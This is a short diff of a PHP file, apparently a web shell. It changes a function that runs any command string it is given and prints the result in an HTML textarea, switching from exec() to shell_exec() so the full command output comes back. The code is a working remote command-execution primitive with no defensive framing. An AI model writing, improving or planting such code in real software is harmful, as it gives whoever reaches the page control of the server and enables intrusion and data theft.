@@ -41,7 +41,7 @@ function showEnv($os)
 function executeCommands($com)
 {
     if (!empty($com)) {
-        echo '<p style="padding:20px;margin:20px;background-color:white;"><b> ~~Command output: ~~</b></p><textarea cols="80" rows="10">' . exec($com) . '</textarea>';
+        echo '<p style="padding:20px;margin:20px;background-color:white;"><b> ~~Command output: ~~</b></p><textarea cols="80" rows="10">' . shell_exec($com) . '</textarea>';
     }
 }
 
